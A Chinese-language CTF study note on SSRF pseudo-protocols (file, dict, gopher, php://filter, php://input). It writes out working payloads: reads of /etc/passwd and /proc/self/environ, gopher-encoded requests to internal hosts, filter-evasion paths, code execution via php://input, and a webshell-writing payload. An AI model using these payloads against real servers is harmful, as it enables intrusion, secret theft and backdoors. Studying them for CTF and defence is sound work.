---
title: SSRF伪协议
categories:
  - 学习
tags:
  - SSRF
abbrlink: 5a21df03
---

## 伪协议

```php
file://  查找内网存活主机IP;从文件系统中获取文件内容，格式为file://[文件路径]
dict://  查找内网主机开放端口;字典服务协议，访问字典资源，如 dict://ip:6739/info:
http://  目录扫描;
ftp:// 	 可用于网络端口扫描
sftp://  SSH文件传输协议或安全文件传输协议
Idap://  轻量级目录访问协议
tftp://  简单文件传输协议gopher://分布式文档传递服务
```

### file://

**作用**：从文件系统中获取文件内容，格式为`file://[文件路径]`

```php
#读取文件passwd
file:///etc/passwd 

#显示当前操作系统网卡的IP
file:///etc/hosts

#显示arp缓存表（寻找内网其他主机）
file:///proc/net/arp

#显示当前网段的路由信息
file:///proc/net/fib_trie
```

### dict://  

**作用**：字典服务协议，访问字典资源，格式为` dict://ip:(6739)/info:(TCP/IP数据)`

![image-20250331105218948](https://flyfish567.oss-cn-shenzhen.aliyuncs.com/web.imgimage-20250331105218948.png)

**获取网页信息**

`dict://ip:(端口)/info`

### http://

**作用**：常规URL形式，允许通过HTTP1.0的GET方法，以只读访问文件或资源,CTF常用于远程文件包含

~~要用common.txt?~~

![image-20250331112425212](https://flyfish567.oss-cn-shenzhen.aliyuncs.com/web.imgimage-20250331112425212.png)

### gopher://

利用范围较广：GET提交、POST提交、redis、fastcgi、sql

(默认监听端口70)

**`gopher`请求不转发第一个字符！！！要一个填充位**

![image-20250331144556230](https://flyfish567.oss-cn-shenzhen.aliyuncs.com/web.imgimage-20250331144556230.png)

**作用**

![](https://flyfish567.oss-cn-shenzhen.aliyuncs.com/web.imgimage-20250331144905565.png)

#### **GET提交**

![image-20250331152656930](https://flyfish567.oss-cn-shenzhen.aliyuncs.com/web.imgimage-20250331152656930.png)

```php
需要保留的头部信息
GET /name.php?name=FLYFISH HTTP1.1  #路径
Host:172.114.514.1				   #目标IP地址

!!!有一个换行！！！！
```

##### 构造

**格式**:`URL:gopher://<host>:<port>/<gopher-path>`

**注意添加端口号80和填充位_**

`URL编码 空格 %20 问号 %3f 换行符 %0d%0A`

**LIKE**

`gopher://172.114.514.4:80/_GET%20/name.php%3fname=FLYFISH%20HTTP/1.1%0d%0AHOST:%20172.114.514.4%0d%0A`

**方法2**

通过BP提交`url=gopher://172.114.514.4:80/_`，用BP拦截了包之后在url=.../_之后粘贴`GET /name.php?name=FLYFISH HTTP1.1 Host:172.114.514.1 `并将粘贴的内容进行**两次**URL编码

#### POST提交

##### 构造

```php
需要保留头部信息
POST /name.php HTTP/1.1
Host: 172.250.250.4
Content-Type:	   #类似application/x-www-form-urlencoded
Content-Length: 12   #随内容长度变化

name=FLYFISH
```

通过BP提交`url=gopher://172.114.514.4:80/_`，用BP拦截了包之后在url=.../_之后粘贴需要保留的头部信息，并将粘贴的内容进行**两次**URL编码

### php://

**1. `php://filter`：文件内容编码与转换**

**作用**：对文件内容进行编码、压缩、转换后输出。
**利用场景**：

- **绕过内容显示限制**：将文件内容以Base64、ROT13等编码形式输出，避免直接显示敏感明文。
- **过滤敏感字符**：通过多层过滤器处理文件内容，绕过简单黑名单检测。

**攻击示例**：

```
// 构造URL参数读取/etc/passwd并Base64编码
?url=php://filter/convert.base64-encode/resource=/etc/passwd

// 漏洞代码（直接使用用户输入）：
$content = file_get_contents($_GET['url']);
echo $content; // 输出Base64字符串，攻击者解码即可获取明文
```

**高级利用**：

- **多过滤器链**：组合多个过滤器（如压缩→编码→转换）：

  ```
  // 读取文件→压缩→Base64编码→转大写
  ?url=php://filter/zlib.deflate|convert.base64-encode|string.toupper/resource=/etc/passwd
  ```

- **绕过关键词过滤**：若过滤`/etc/passwd`，可通过路径遍历或编码绕过：

  ```
  ?url=php://filter/convert.base64-encode/resource=../../../../etc/passwd
  ?url=php://filter/convert.base64-encode/resource=/var/www/../etc/passwd
  ```

**2. `php://input`：原始输入流与代码执行**

**作用**：读取HTTP请求体（POST数据）的原始内容。
**利用条件**：

- `allow_url_include=On`（默认关闭，PHP >= 5.2.0）。
- 服务端代码包含`include()`、`file_get_contents()`等函数直接处理用户输入。

**攻击示例**：

```
// 攻击者发送POST请求：
POST /vuln.php?url=php://input HTTP/1.1
...
<?php system('id'); ?>

// 漏洞代码（包含用户输入）：
include($_GET['url']); // 执行POST中的PHP代码

// 输出结果：
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

**利用扩展**：

- **写入Webshell**：通过POST数据写入文件：

  ```
  POST /vuln.php?url=php://input HTTP/1.1
  ...
  <?php file_put_contents('shell.php', '<?php eval($_POST["cmd"]); ?>'); ?>
  ```
  
- **窃取环境变量**：读取`/proc/self/environ`（需路径访问权限）：

  ```
  ?url=php://filter/convert.base64-encode/resource=/proc/self/environ
  ```

**3. `php://fd`：直接操作文件描述符**

**作用**：通过文件描述符编号访问已打开的文件句柄。
**利用场景**：

- 攻击者预测或爆破文件描述符编号（如`3`）。
- 结合其他漏洞（如文件泄露）获取有效描述符。

**示例**：

```
// 假设服务端已打开描述符3指向/etc/passwd
?url=php://fd/3

// 漏洞代码：
echo file_get_contents($_GET['url']); // 输出/etc/passwd内容
```
